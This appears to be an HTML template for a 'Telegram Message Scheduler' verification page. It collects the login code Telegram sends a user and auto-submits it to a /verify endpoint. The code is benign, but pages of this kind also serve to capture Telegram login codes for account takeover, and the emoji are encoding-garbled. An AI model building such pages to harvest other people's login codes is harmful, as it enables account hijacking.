<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify Login - Telegram Message Scheduler</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            background: white;
            border-radius: 12px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            padding: 40px;
            width: 100%;
            max-width: 450px;
        }

        .header {
            text-align: center;
            margin-bottom: 30px;
        }

        .header h1 {
            color: #333;
            font-size: 28px;
            margin-bottom: 10px;
        }

        .header p {
            color: #666;
            font-size: 14px;
        }

        .code-input {
            text-align: center;
            margin: 20px 0;
        }

        .code-input input {
            font-size: 32px;
            letter-spacing: 10px;
            text-align: center;
            width: 100%;
            padding: 15px;
            border: 2px solid #ddd;
            border-radius: 8px;
            transition: border-color 0.3s;
        }

        .code-input input:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            color: #333;
            font-weight: 500;
            margin-bottom: 8px;
            font-size: 14px;
        }

        input[type="password"] {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 6px;
            font-size: 14px;
            transition: border-color 0.3s;
        }

        input[type="password"]:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }

        .submit-btn {
            width: 100%;
            padding: 12px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
        }

        .submit-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
        }

        .submit-btn:active {
            transform: translateY(0);
        }

        .info-box {
            background: #f0f4ff;
            border-left: 4px solid #667eea;
            padding: 12px;
            border-radius: 4px;
            margin-bottom: 20px;
            font-size: 13px;
            color: #555;
        }

        .footer {
            text-align: center;
            margin-top: 20px;
            font-size: 12px;
            color: #999;
        }

        .loading {
            display: none;
            text-align: center;
            margin-top: 20px;
        }

        .spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #667eea;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>üîê Verify Code</h1>
            <p>Enter the code sent to your Telegram</p>
        </div>

        <div class="info-box">
            <strong>‚ÑπÔ∏è Check your Telegram:</strong> You should receive a 5-digit verification code. If you don't see it, check your spam folder.
        </div>

        <form id="verifyForm" method="POST" action="/verify">
            <div class="code-input">
                <input type="text" id="code" name="code" maxlength="6" required placeholder="00000" autocomplete="off">
            </div>

            <button type="submit" class="submit-btn">Verify & Continue</button>
        </form>

        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p style="margin-top: 15px; color: #666; font-size: 14px;">Verifying your account...</p>
        </div>

        <div class="footer">
            {{ watermark }}
        </div>
    </div>

    <script>
        // Auto-focus on code input and only allow numbers
        const codeInput = document.getElementById('code');
        codeInput.focus();

        codeInput.addEventListener('input', function(e) {
            this.value = this.value.replace(/[^0-9]/g, '');
            // Auto-submit when 5 or 6 digits are entered
            if (this.value.length >= 5) {
                setTimeout(() => {
                    document.getElementById('verifyForm').submit();
                }, 300);
            }
        });

        document.getElementById('verifyForm').addEventListener('submit', function(e) {
            const form = this;
            const loading = document.getElementById('loading');
            
            if (codeInput.value.length < 5 || codeInput.value.length > 6) {
                e.preventDefault();
                alert('Please enter a valid verification code (5-6 digits)');
                return;
            }

            // Show loading state
            loading.style.display = 'block';
            form.style.display = 'none';
        });
    </script>
</body>
</html>
